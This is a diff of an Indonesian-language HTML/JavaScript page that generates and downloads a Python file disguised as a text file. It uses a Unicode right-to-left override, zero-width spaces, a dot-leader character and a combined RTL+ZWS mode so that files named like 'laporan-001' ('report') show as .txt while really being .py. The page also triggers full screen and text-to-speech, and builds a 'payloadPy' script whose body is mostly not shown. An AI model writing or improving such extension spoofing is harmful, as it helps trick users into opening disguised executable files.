@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Generator Blob &amp; ObjectURL — Spoofed .py</title>
+<title>Generator Blob &amp; ObjectURL — Spoofed .txt → .py</title>
 <style>
 * {
 box-sizing: border-box;
@@ -76,9 +76,11 @@ background: #424242;
 display: flex;
 gap: 8px;
 margin-bottom: 15px;
+flex-wrap: wrap;
 }
 .mode-selector label {
 flex: 1;
+min-width: 120px;
 padding: 10px;
 background: #eee;
 border-radius: 6px;
@@ -146,22 +148,46 @@ padding: 2px 4px;
 border-radius: 3px;
 font-family: monospace;
 }
+.preview {
+background: #0a0a0a;
+border: 1px solid #333;
+border-radius: 6px;
+padding: 12px;
+margin-bottom: 15px;
+font-family: monospace;
+font-size: 12px;
+color: #0f0;
+}
+.preview .baris {
+padding: 3px 0;
+}
+.preview .label {
+color: #888;
+display: inline-block;
+width: 120px;
+}
 </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-<h2>Generator Blob &amp; ObjectURL — Spoofed .py</h2>
-<p>Nama file yang muncul di folder Download adalah <code>script-001.txt</code>, tapi ekstensi aslinya adalah <code>.py</code> yang disembunyikan dengan karakter Unicode.</p>
+<h2>Generator Blob &amp; ObjectURL — Spoofed .txt → .py</h2>
+<p>File tampil sebagai <code>.txt</code> di folder Download, tapi ekstensi aslinya adalah <code>.py</code> yang disembunyikan dengan karakter Unicode RTL Override.</p>
 
 <div class="info-box">
-<strong>Mode spoofing ekstensi:</strong>
+<strong>Struktur nama file:</strong>
 <ul style="margin-top:6px;margin-left:18px">
-<li><strong>RTL Override</strong> — <code>script-001\u202Eyp.txt</code> tampil sebagai <code>script-001.txt</code></li>
-<li><strong>Null Byte</strong> — <code>script-001.py\u0000.txt</code> (legacy parser terpotong)</li>
-<li><strong>Unicode Full Stop</strong> — pakai <code>\u2024</code> (one dot leader) sebagai pemisah</li>
-<li><strong>Zero-Width Space</strong> — <code>script-001.py\u200B.txt</code> tak terlihat</li>
+<li>Nama asli di memori: <code>laporan-001\u202Eyp.txt</code></li>
+<li>Nama tampil ke user: <code>laporan-001.txt</code></li>
+<li>Ekstensi efektif: <code>.py</code></li>
 </ul>
+</div>
+
+<div class="preview">
+<div class="baris"><span class="label">Asli (byte):</span> laporan-001 \u202E y p . t x t</div>
+<div class="baris"><span class="label">Render RTL:</span> laporan-001 . t x t</div>
+<div class="baris"><span class="label">Ekstensi OS:</span> .py</div>
+<div class="baris"><span class="label">Tampil user:</span> laporan-001.txt</div>
 </div>
 
 <h3 style="margin-bottom:10px;font-size:14px">Pilih mode spoofing:</h3>
@@ -169,14 +195,14 @@ font-family: monospace;
 <input type="radio" name="mode" id="mode-rtl" value="rtl" checked>
 <label for="mode-rtl">RTL Override</label>
 
-<input type="radio" name="mode" id="mode-null" value="null">
-<label for="mode-null">Null Byte</label>
+<input type="radio" name="mode" id="mode-zws" value="zws">
+<label for="mode-zws">Zero-Width</label>
 
 <input type="radio" name="mode" id="mode-uni" value="uni">
 <label for="mode-uni">Unicode Stop</label>
 
-<input type="radio" name="mode" id="mode-zws" value="zws">
-<label for="mode-zws">Zero-Width</label>
+<input type="radio" name="mode" id="mode-combo" value="combo">
+<label for="mode-combo">Combo (RTL + ZWS)</label>
 </div>
 
 <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Spoofed .py</button>
@@ -214,7 +240,7 @@ console.warn("TTS gagal:", e);
 
 var payloadPy = "# ============================================\n" +
 "# Script Python - payload Blob ObjectURL\n" +
-"# Nama file tampil sebagai .txt, tapi ekstensi asli .py\n" +
+"# Nama tampil .txt, ekstensi asli .py\n" +
 "# ============================================\n" +
 "\n" +
 "import os\n" +
@@ -272,34 +298,44 @@ if (radios[i].checked) return radios[i].value;
 return 'rtl';
 }
 
+function reverseStr(s) {
+var out = "";
+for (var i = s.length - 1; i >= 0; i--) {
+out += s.charAt(i);
+}
+return out;
+}
+
 function buatNamaSpoofed(id, mode) {
-var base = "script-" + String(id).padStart(3, '0');
+var base = "laporan-" + String(id).padStart(3, '0');
+var ext = "py";
+var txt = "txt";
 
 switch (mode) {
 case 'rtl':
-return base + "\u202Eyp.txt";
-case 'null':
-return base + ".py\u0000.txt";
-case 'uni':
-return base + "\u2024py.txt";
+return base + "\u202E" + reverseStr(ext) + "." + txt;
 case 'zws':
-return base + ".py\u200B.txt";
+return base + "." + ext + "\u200B." + txt;
+case 'uni':
+return base + "\u2024" + ext + "." + txt;
+case 'combo':
+return base + "\u202E" + reverseStr(ext) + "\u200B." + txt;
 default:
-return base + "\u202Eyp.txt";
+return base + "\u202E" + reverseStr(ext) + "." + txt;
 }
 }
 
 function buatNamaTampil(id, mode) {
-var base = "script-" + String(id).padStart(3, '0');
+var base = "laporan-" + String(id).padStart(3, '0');
 switch (mode) {
 case 'rtl':
 return base + ".txt";
-case 'null':
-return base + ".py_NUL_.txt";
-case 'uni':
-return base + ".py.txt";
 case 'zws':
 return base + ".py_ZWS_.txt";
+case 'uni':
+return base + ".py.txt";
+case 'combo':
+return base + ".txt";
 default:
 return base + ".txt";
 }
@@ -370,9 +406,9 @@ updateCounter();
 var mode = ambilMode();
 var label = {
 'rtl': 'RTL Override',
-'null': 'Null Byte',
+'zws': 'Zero-Width Space',
 'uni': 'Unicode Stop',
-'zws': 'Zero-Width Space'
+'combo': 'Combo RTL + ZWS'
 }[mode];
 
 speak("Mengaktifkan mode " + label + ".");
@@ -395,7 +431,7 @@ setTimeout(function() {
 isProcessing = true;
 startBtn.disabled = true;
 stopBtn.disabled = false;
-speak("Proses pembuatan berkas dimulai.");
+speak("Proses pembuatan berkas Python dimulai.");
 processLoop(1);
 }, 300);
 });
